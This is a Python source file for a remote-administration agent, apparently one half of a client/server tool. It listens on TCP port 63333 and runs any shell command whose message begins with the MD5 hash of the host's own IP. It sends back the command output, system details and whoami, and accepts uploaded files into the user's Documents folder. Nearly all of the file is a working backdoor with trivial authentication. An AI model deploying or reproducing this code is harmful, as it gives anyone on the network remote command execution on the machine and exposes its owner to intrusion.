import socket
import threading
import subprocess
from tkinter import messagebox
from configparser import ConfigParser
from hashlib import md5
from psutil import net_if_addrs
from os import path
from psutil import cpu_freq, cpu_count, users, virtual_memory
from pathlib import Path
from base64 import b64decode
from scapy.layers.inet import TCP, IP
from scapy.all import sniff


class Client:
    def __init__(self):
        self.config = ConfigParser()
        self.port = 63333
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.self_ip = None
        self.first_configuration()

        self.server_address = (str(self.self_ip), self.port)
        self.server_socket.bind(self.server_address)

        self.start_server()

    def first_configuration(self):
        network_adapters = net_if_addrs()

        if 'Ethernet' in network_adapters:
            self.self_ip = network_adapters['Ethernet'][1].address

        elif 'Wi-Fi' in network_adapters:
            self.self_ip = network_adapters['Wi-Fi'][1].address

        else:
            messagebox.showerror("Adapter Error", "No internet adapters found!")
            exit()

    def check_integrity(self, cmd):
        pre_handshake = md5(str(self.self_ip).encode()).hexdigest()

        if str(cmd).startswith(str(pre_handshake)):
            return True

        else:
            return False

    def execute_commands(self, client_socket):
        command = client_socket.recv(1024).decode()

        if self.check_integrity(command):
            index = str(command).find('+')
            result = str(command)[index + len('+'):].strip()

            if str(result) == "info":
                full_info = [cpu_freq(), cpu_count(), virtual_memory(), users()]
                print(full_info)
                full = str(cpu_freq().current) + "+" + str(cpu_count()) + "+" + str(virtual_memory().total)

                process = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                output, error = process.communicate()

                client_socket.sendall(output + error + full.encode())

                client_socket.close()

            elif str(result) == "send":
                file_bytes = client_socket.recv(1024)
                file_size_bytes = client_socket.recv(1024)

                file_name_bytes = b64decode(file_bytes)
                file_sizes = b64decode(file_size_bytes)

                try:
                    file_name = file_name_bytes.decode('utf-8')
                    file_size = file_sizes.decode('utf-8')

                    chunk = int(0.90 * float(file_size))

                    documents_path = Path(path.expanduser("~/Documents"))
                    storage_location = documents_path / "RMDownloads" / file_name

                    file = open(storage_location, "wb")
                    file_bytes = b""

                    done = False

                    while not done:
                        data = client_socket.recv(chunk)
                        if file_bytes[-5:] == b"<END>":
                            done = True
                            print("Done!")
                            file_bytes = file_bytes[:-5]

                        else:
                            file_bytes += data

                    file.write(file_bytes)
                    file.close()
                    client_socket.close()

                except Exception:
                    client_socket.close()

            else:
                # Execute the command on the server and capture the output
                process = subprocess.Popen(result, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                output, error = process.communicate()

                client_socket.sendall(output + error)
                client_socket.close()

        else:
            client_socket.send("Connection Rejected!".encode())
            raise KeyboardInterrupt

    def start_server(self):
        self.server_socket.listen(10)
        print("Server listening for connections...")

        try:
            while True:
                # Accept a client connection
                client_socket, client_address = self.server_socket.accept()
                print(f"Connection accepted from: {client_address}")

                # Create a thread to handle the client connection
                client_thread = threading.Thread(target=self.execute_commands, args=(client_socket,))
                client_thread.start()

        except KeyboardInterrupt:
            # Close the server socket
            self.server_socket.close()


if __name__ == '__main__':
    try:
        Client()

    except SystemExit:
        exit()
